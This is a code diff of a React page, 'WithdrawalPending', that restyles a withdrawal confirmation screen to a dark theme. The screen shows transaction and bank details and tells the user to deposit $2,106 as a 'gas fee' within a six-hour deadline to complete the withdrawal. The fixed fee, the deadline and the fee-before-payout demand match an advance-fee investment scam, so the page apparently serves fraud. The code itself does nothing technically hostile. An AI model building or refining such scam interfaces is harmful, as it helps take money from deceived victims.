@@ -5,7 +5,7 @@ export default function WithdrawalPending() {
   const location = useLocation();
   const state = location.state || {};
 
-  // Values passed from Dashboard when initiating withdrawal
+  // Values passed from Dashboard
   const method = state.method || "Wire Transfer";
   const amount = state.amount || 0;
   const accountName = state.accountName || "Not provided";
@@ -24,7 +24,6 @@ export default function WithdrawalPending() {
 
   // Deposit deadline (6 hours from now)
   const depositDeadline = new Date(Date.now() + 6 * 60 * 60 * 1000);
-
   // Withdrawal timeline (15 minutes after deposit deadline)
   const withdrawalTimeline = new Date(
     depositDeadline.getTime() + 15 * 60 * 1000
@@ -33,58 +32,91 @@ export default function WithdrawalPending() {
   if (loading) {
     // Full page loader
     return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-100">
-        <div className="w-20 h-20 border-8 border-indigo-600 border-t-transparent rounded-full animate-spin"></div>
+      <div className="min-h-screen flex items-center justify-center bg-gray-900">
+        <div className="w-20 h-20 border-8 border-teal-400 border-t-transparent rounded-full animate-spin"></div>
       </div>
     );
   }
 
   return (
-    <div className="min-h-screen bg-gray-50 flex items-center justify-center">
-      <div className="max-w-4xl w-full bg-white shadow-xl rounded-lg p-12">
-        <h1 className="text-4xl font-bold text-center text-indigo-700 mb-10">
+    <div className="min-h-screen bg-gray-900 flex items-center justify-center p-6">
+      <div className="max-w-4xl w-full bg-gray-800 shadow-2xl rounded-xl p-12 border border-teal-500">
+        <h1 className="text-4xl font-bold text-center text-teal-400 mb-10">
           Withdrawal Confirmation
         </h1>
 
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 text-lg text-gray-800">
-          <div>
-            <p>
-              <strong>Transaction ID:</strong> {transactionId}
-            </p>
-            <p>
-              <strong>Method:</strong> {method}
-            </p>
-            <p>
-              <strong>Wire Transfer Amount:</strong> ${amount}
-            </p>
-            <p>
-              <strong>Deposit Deadline:</strong>{" "}
+        {/* Transaction Details */}
+        <div className="space-y-6 mb-10">
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">
+              Transaction ID
+            </label>
+            <p className="text-lg font-semibold text-white">{transactionId}</p>
+          </div>
+
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">Method</label>
+            <p className="text-lg font-semibold text-white">{method}</p>
+          </div>
+
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">
+              Wire Transfer Amount
+            </label>
+            <p className="text-lg font-semibold text-white">${amount}</p>
+          </div>
+
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">
+              Deposit Deadline
+            </label>
+            <p className="text-lg font-semibold text-white">
               {depositDeadline.toLocaleString()}
-            </p>
-            <p>
-              <strong>Withdrawal Timeline:</strong>{" "}
-              {withdrawalTimeline.toLocaleString()}
             </p>
           </div>
 
-          <div>
-            <p>
-              <strong>Account Name:</strong> {accountName}
-            </p>
-            <p>
-              <strong>Account Number:</strong> {accountNumber}
-            </p>
-            <p>
-              <strong>Bank Name:</strong> {bankName}
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">
+              Withdrawal Timeline
+            </label>
+            <p className="text-lg font-semibold text-white">
+              {withdrawalTimeline.toLocaleString()}
             </p>
           </div>
         </div>
 
-        <p className="mt-10 text-red-600 font-semibold text-center text-xl">
-          Instruction: Please deposit <strong>$2,106</strong> into your account
-          as gas fee before <strong>{depositDeadline.toLocaleString()}</strong>{" "}
-          to complete the withdrawal.
-        </p>
+        {/* Account Details */}
+        <h2 className="text-2xl font-bold text-teal-400 mb-6">
+          Account Details
+        </h2>
+        <div className="space-y-6 mb-10">
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">Account Name</label>
+            <p className="text-lg font-semibold text-white">{accountName}</p>
+          </div>
+
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">
+              Account Number
+            </label>
+            <p className="text-lg font-semibold text-white">{accountNumber}</p>
+          </div>
+
+          <div className="bg-gray-700 p-4 rounded-lg border border-gray-600">
+            <label className="block text-sm text-gray-400">Bank Name</label>
+            <p className="text-lg font-semibold text-white">{bankName}</p>
+          </div>
+        </div>
+
+        {/* Instruction */}
+        <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
+          <p className="text-xl font-semibold text-red-400">
+            Instruction: Please deposit <strong>$2,106</strong> into your
+            account as gas fee before{" "}
+            <strong>{depositDeadline.toLocaleString()}</strong> to complete the
+            withdrawal.
+          </p>
+        </div>
       </div>
     </div>
   );
